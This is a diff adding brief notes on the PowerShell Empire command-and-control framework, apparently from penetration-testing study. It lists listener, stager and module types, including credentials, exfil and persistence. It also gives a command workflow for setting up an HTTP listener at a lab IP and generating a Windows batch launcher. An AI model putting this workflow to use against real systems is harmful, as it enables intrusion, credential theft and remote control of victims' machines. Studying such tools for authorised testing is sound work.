@@ -1,0 +1,61 @@
+POWERSHELL EMPIRE
+	listeners
+dbx
+http
+http_com
+http_foreign
+http_hop
+meterpreter
+	stagers
+	windows/
+launcher_bat
+launcher_vbs
+dll
+macro
+hta
+pth_wmis
+hop_php
+ducky
+war
+hta
+stager
+	multi/
+bash
+launcher
+pyinstaller
+war
+	module types
+code_execution	*
+collection
+credentials
+exfil
+expliotation
+fun
+lateral_movement
+management
+persistence
+privesc	*
+python
+recon
+situational_awareness
+	host	*
+	network
+trollsploit
+
+./empire -l
+	-list active listeners
+./empire -s launcher -o Listener=test
+	-generate launcher from cli
+	
+	X-workflow
+	-setup listener
+listeners
+uselistener http_com
+info
+set Host http://10.11.0.44:8081
+execute
+back
+usestager windows/launcher_bat
+info
+set Listener eternal
+execute
